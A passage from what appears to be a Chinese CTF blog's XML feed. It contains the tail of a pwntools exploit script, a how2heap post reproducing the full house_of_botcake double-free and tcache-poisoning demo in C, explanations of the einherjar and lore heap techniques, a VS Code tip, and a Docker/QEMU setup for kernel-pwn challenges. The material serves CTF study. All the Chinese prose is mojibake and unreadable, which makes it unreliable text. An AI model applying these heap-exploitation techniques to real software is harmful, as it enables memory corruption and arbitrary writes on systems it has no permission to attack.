class="hljs-number">0x3e0</span>))<br><span class="hljs-comment"># 0x1450 0x1590 0x15a0</span><br><span class="hljs-comment"># dbg()</span><br><br><span class="hljs-comment"># dbg()</span><br>cmd(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">&#x27;Size&#x27;</span> , <span class="hljs-number">0x1000</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>vscodeä½¿ç”¨pwntoolsä»£ç é«˜äº®å‡ºé”™</title>
    <link href="/2022/10/25/vscode%E4%BD%BF%E7%94%A8pwntools%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E5%87%BA%E9%94%99/"/>
    <url>/2022/10/25/vscode%E4%BD%BF%E7%94%A8pwntools%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E5%87%BA%E9%94%99/</url>
    
    <content type="html"><![CDATA[<blockquote><p>vscodeåœ¨ä½¿ç”¨pwntoolsçš„sendç³»åˆ—å‡½æ•°æ—¶ï¼Œä¼šå‡ºç°é«˜äº®é”™è¯¯çš„æƒ…å†µï¼Œç›®å‰æœ€å¥½çš„è§£å†³åŠæ³•æ—¶å¯¹pwntoolsæºç è¿›è¡Œæ›´æ”¹</p></blockquote><p>å³é”®sendå‡½æ•°ï¼Œé€‰æ‹©<code>Go to Definition</code>ï¼Œæ‰“å¼€pwntoolsæºç </p><p><img src="/img/article/vscode-pwntools/image-20221025192410368.png" alt="image-20221025192410368"></p><p><code>ctrl+F</code>æœç´¢send_rawå‡½æ•°</p><p><img src="/img/article/vscode-pwntools/image-20221025192616883.png" alt="image-20221025192616883"></p><p>æŠŠå‡½æ•°æœ«å°¾çš„<code>raise EOFError(&#39;Not implemented&#39;)</code>æ›´æ¢æˆ<code>raise NotImplementedError()</code>æ—¢å¯</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€how2heapã€‘ botcake,einherjar,lore</title>
    <link href="/2022/10/20/how2heap%E2%91%A0%20botcake,einherjar,lore/"/>
    <url>/2022/10/20/how2heap%E2%91%A0%20botcake,einherjar,lore/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬ç³»åˆ—å°†é’ˆå¯¹glibc2.31åŠglibc2.35ä¸¤ä¸ªç‰ˆæœ¬è¿›è¡Œè®¨è®ºï¼Œå…¶ä»–ç‰ˆæœ¬å¯ä»¥æ ¹æ®ç‰¹æ€§è¿›è¡Œç±»æ¨ï¼Œå»ºè®®å…ˆå¯¹å„ç§å †å—çš„åŸºæœ¬ç‰¹æ€§å’Œæ•°æ®ç»“æ„åšå·²äº†è§£ä¹‹åè¿›è¡Œå­¦ä¹ ã€‚</p></blockquote><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p>house_of_botcakeåˆ©ç”¨çš„æ˜¯å—çš„åˆ†å‰²ï¼Œä½¿å¾—åªå­˜åœ¨uafæ¼æ´çš„å‰æä¸‹å®ç°å †å—çš„æº¢å‡º,è¾¾åˆ°è·å–ä»»æ„åœ°å€çš„ç›®çš„ï¼Œä¸‹é¢æˆ‘ä»¬ç”¨how2heapä¸­çš„ä¾‹å­è¿›è¡Œç†è§£ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This attack should bypass the restriction introduced in</span><br><span class="hljs-comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span><br><span class="hljs-comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span><br><span class="hljs-comment">     * simple tcache poisoning</span><br><span class="hljs-comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span><br><br>    <span class="hljs-comment">// disable buffering so _IO_FILE does not interfere with our heap</span><br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// introduction</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This attack only relies on double free.\n&quot;</span>);<br><br>    <span class="hljs-comment">// prepare the target</span><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The address we want malloc() to return, namely,&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);<br><br>    <span class="hljs-comment">// prepare heap layout</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Preparing heap layout&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a chunk for later consolidation&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating the victim chunk.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-comment">// cause chunk overlapping</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);<br>    <span class="hljs-built_in">free</span>(prev);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// a is already freed</span><br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <br>    <span class="hljs-comment">// simple tcache poisoning</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Launch tcache poisoning&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);<br>    b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;<br>    <br>    <span class="hljs-comment">// take target out</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we can cash out the target chunk.&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The new chunk is at %p\n&quot;</span>, c);<br>    <br>    <span class="hljs-comment">// sanity check</span><br>    assert(c==stack_var);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got control on target/stack!\n\n&quot;</span>);<br>    <br>    <span class="hljs-comment">// note</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note:&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬ç”¨7ä¸ªchunkå¡«æ»¡tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// cause chunk overlapping</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>    <span class="hljs-built_in">free</span>(x[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åfreeæ‰åŒæ ·å¤§å°çš„prev chunkå’Œa chunkï¼Œè¿™æ—¶ä»–ä»¬ä¼šåœ¨unsorted binå†…åˆå¹¶ä¸ºä¸€ä¸ªå¤§chunk</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">puts<span class="hljs-comment">(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;)</span>;<br>free<span class="hljs-comment">(a)</span>;<br><br>puts<span class="hljs-comment">(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;)</span>;<br>free<span class="hljs-comment">(prev)</span>;<br></code></pre></td></tr></table></figure><p>å…ˆç”³è¯·ä¸€ä¸ªchunkï¼Œç„¶ååˆ©ç”¨uafï¼Œå¯¹ a chunkå†æ¬¡freeï¼Œè®©å…¶è¿›å…¥tcacheã€‚æ­¤æ—¶ï¼Œa chunkåŒæ—¶åœ¨tcacheå’Œunsorted bin ä¸­ã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">puts<span class="hljs-comment">(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;)</span>;<br>malloc<span class="hljs-comment">(0x100)</span>;<br><span class="hljs-comment">/*VULNERABILITY*/</span><br>free<span class="hljs-comment">(a)</span>;<span class="hljs-comment">// a is already freed</span><br><span class="hljs-comment">/*VULNERABILITY*/</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå¤§ä¸€ç‚¹çš„chunkï¼Œæ¯”å¦‚0x120ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠprevçš„æŒ‡é’ˆè¿”å›å›æ¥ï¼Œå¹¶ä¸”å¯ä»¥å¯¹a chunkè¿›è¡Œæº¢å‡ºï¼Œè¿›è€Œæ›´æ”¹a chunkçš„fdï¼Œbkç­‰ç­‰ã€‚</p><h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><p>house of einherjaræ˜¯ä¸€ç§ç‰¹æ®Šçš„å †åˆ©ç”¨æ‰‹æ®µï¼Œåœ¨å­˜åœ¨å †æº¢å‡ºå¯ä»¥æ›´æ”¹ä¸‹ä¸€ä¸ªchunkçš„PREV_INUSEä½æ—¶ï¼Œå¯ä»¥åˆ©ç”¨freeçš„å †å—åˆå¹¶ï¼Œä½¿ç”¨è¿™ç§æ–¹å¼å®ç°ä»»æ„åœ°å€çš„æ§åˆ¶ã€‚</p><p><img src="/img/article/how2heap1/backward_consolidate-1666247169487-3.png" alt="ç¤ºæ„å›¾"></p><h3 id="æº¢å‡ºå‰çŠ¶æ€"><a href="#æº¢å‡ºå‰çŠ¶æ€" class="headerlink" title="æº¢å‡ºå‰çŠ¶æ€"></a>æº¢å‡ºå‰çŠ¶æ€</h3><p>å‡è®¾æº¢å‡ºå‰çŠ¶æ€å¦‚ä¸‹</p><p><img src="/img/article/how2heap1/einherjar_before_overflow.png" alt="img"></p><h3 id="æº¢å‡º"><a href="#æº¢å‡º" class="headerlink" title="æº¢å‡º"></a>æº¢å‡º</h3><p>è¿™é‡Œæˆ‘ä»¬å‡è®¾ p0 å †å—ä¸€æ–¹é¢å¯ä»¥å†™ prev_size å­—æ®µï¼Œå¦ä¸€æ–¹é¢ï¼Œå­˜åœ¨ off by one çš„æ¼æ´ï¼Œå¯ä»¥å†™ä¸‹ä¸€ä¸ª chunk çš„ PREV_INUSE éƒ¨åˆ†ï¼Œé‚£ä¹ˆ</p><p><img src="/img/article/how2heap1/einherjar_overflowing.png" alt="img"></p><h3 id="æº¢å‡ºå"><a href="#æº¢å‡ºå" class="headerlink" title="æº¢å‡ºå"></a>æº¢å‡ºå</h3><p><strong>å‡è®¾æˆ‘ä»¬å°† p1 çš„ prev_size å­—æ®µè®¾ç½®ä¸ºæˆ‘ä»¬æƒ³è¦çš„ç›®çš„ chunk ä½ç½®ä¸ p1 çš„å·®å€¼</strong>ã€‚åœ¨æº¢å‡ºåï¼Œæˆ‘ä»¬é‡Šæ”¾ p1ï¼Œåˆ™æˆ‘ä»¬æ‰€å¾—åˆ°çš„æ–°çš„ chunk çš„ä½ç½® <code>chunk_at_offset(p1, -((long) prevsize))</code> å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ chunk ä½ç½®äº†ã€‚</p><p>å½“ç„¶ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿™é‡Œä¼šå¯¹æ–°çš„ chunk è¿›è¡Œ unlink ï¼Œå› æ­¤éœ€è¦ç¡®ä¿åœ¨å¯¹åº” chunk ä½ç½®æ„é€ å¥½äº† fake chunk ä»¥ä¾¿äºç»•è¿‡ unlink çš„æ£€æµ‹ã€‚</p><p><img src="/img/article/how2heap1/einherjar_after_overflow-1666251341548-11.png" alt="img"></p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¾¿å¯å°†fake chunké€šè¿‡å†æ¬¡mallocè·å¾—</p><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><p>House of Lore å¯ä»¥å®ç°åˆ†é…ä»»æ„æŒ‡å®šä½ç½®çš„ chunkï¼Œä»è€Œä¿®æ”¹ä»»æ„åœ°å€çš„å†…å­˜ã€‚</p><p>å®é™…è¿‡ç¨‹å°±æ˜¯æ§åˆ¶smallbinçš„æœ€åä¸€ä¸ªchunkçš„bkæŒ‡é’ˆï¼Œä»¥åŠfakechunkçš„fdæŒ‡é’ˆå®ŒæˆåŒé“¾è¡¨çš„æ„å»ºæ—¢å¯ä¸¤æ¬¡mallocæ§åˆ¶ä»»æ„åœ°å€</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kernel-pwnbaseè¯¦è§£</title>
    <link href="/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å‚åŠ starnewctf week4åï¼Œæƒ³è¦å¤ç°ä¸€é“kernelçš„é¢˜ã€‚ç½‘ä¸ŠåŸºæœ¬æ‰¾ä¸åˆ°Kernel-pwnçš„baseï¼Œå› æ­¤åšäº†è¿™ä¸ªpwnbaseç”¨äºåœ¨ctfdä¸Šæä¾›åŠ¨æ€kernelé¢˜ç›®ã€‚<br>baseä¸‹è½½åœ°å€<a href="https://github.com/Loora1N/pwnbase/tree/main/kernelbase">kernelbase</a></p></blockquote><h2 id="Dockfile"><a href="#Dockfile" class="headerlink" title="Dockfile"></a>Dockfile</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive apt-get install -y lib32z1 xinetd git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev qemu qemu-system-x86</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m ctf</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./files/ /home/ctf/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> -R 750 /home/ctf</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>dockeråŸºç¡€æ˜¯ubuntu20.04ï¼Œæ•´ä¸ªdockerfileä¸»è¦æ˜¯ä¸‹è½½ä¸€äº›å…³é”®åº“ï¼Œä»¥åŠå¯¹ç›®å½•æƒé™çš„ç®¡ç†ï¼Œæœ€åä¼šè°ƒç”¨<code>start.sh</code>, å¹¶ä¸”å¼€æ”¾9999ç«¯å£</p><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># Add your startup script</span><br><br><span class="hljs-comment"># DO NOT DELETE</span><br>/etc/init.d/xinetd start;<br><span class="hljs-built_in">sleep</span> infinity;<br></code></pre></td></tr></table></figure><p>ä¸œè¥¿å¾ˆçŸ­ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨<code>ctf.xinetd</code></p><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf.xinetd"></a>ctf.xinetd</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">service ctf<br>&#123;<br>    disable = no<br>    socket_type = stream<br>    protocol    = tcp<br>    wait        = no<br>    user        = root<br>    type        = UNLISTED<br>    port        = <span class="hljs-number">9999</span><br>    bind        = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br>    server      = <span class="hljs-regexp">/usr/</span>sbin/chroot<br>    <span class="hljs-comment"># replace helloworld to your program</span><br>    server_args = --userspec=<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span> <span class="hljs-regexp">/ ./</span>home<span class="hljs-regexp">/ctf/</span>helloworld<br>    banner_fail = <span class="hljs-regexp">/etc/</span>banner_fail<br>    <span class="hljs-comment"># safety options</span><br>    per_source= <span class="hljs-number">10</span> <span class="hljs-comment"># the maximum instances of this service per source IP address</span><br>    rlimit_cpu= <span class="hljs-number">20</span> <span class="hljs-comment"># the maximum number of CPU seconds that the service may use</span><br>    <span class="hljs-comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span><br>    <span class="hljs-comment">#access_times = 2:00-9:00 12:00-24:00</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒåœ¨13è¡Œçš„ååŠï¼Œncè¿æ¥åä¼šè°ƒç”¨helloworldç¨‹åº</p><h2 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    init();   <br>    signal(SIGCHLD, SIG_DFL);<br>    system(<span class="hljs-string">&quot;/home/ctf/boot.sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºä¸æ™®é€šçš„pwné¢˜ç›®ç±»ä¼¼ï¼Œå…ˆåˆå§‹åŒ–è¾“å…¥è¾“å‡ºï¼Œéšåè°ƒç”¨boot.shå¯åŠ¨qemuå³å¯ã€‚signalå‡½æ•°æ˜¯ä¸ºäº†é˜²æ­¢systemå‡½æ•°å¯èƒ½å‡ºç°çš„é”™è¯¯ã€‚</p><h2 id="boot-sh"><a href="#boot-sh" class="headerlink" title="boot.sh"></a>boot.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64  \<br>-m 128M \<br>-kernel /home/ctf/bzImage \<br>-initrd /home/ctf/rootfs.cpio \<br>-monitor /dev/null \<br>-cpu kvm64,+smep,+smap \<br>-append <span class="hljs-string">&quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr noapic&quot;</span> \<br>-nographic \<br>-no-reboot <br><br></code></pre></td></tr></table></figure><p>å…³é”®åœ¨äº kernelå’Œinitrdä¸€å®šè¦ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œå³ä¾¿å®ƒä»¬ä¸<code>helloworld</code>åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œsystemè°ƒç”¨æ—¶ä¾ç„¶å¯èƒ½ä¼šå‡ºç°æ‰¾ä¸åˆ°æ–‡ä»¶çš„æƒ…å†µå‡ºç°ï¼Œå»ºè®®åœ¨ <code>-append</code>é‡ŒåŠ å…¥ <code>noapic</code> å¯ä»¥é˜²æ­¢å‡ºç°AIPCé”™è¯¯ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF Week4 PWN WP</title>
    <link href="/2022/10/17/NewStarCTF%20Week4%20PWN%20WP/"/>
    <url>/2022/10/17/NewStarCTF%20Week4%20PWN%20WP/</url>
    
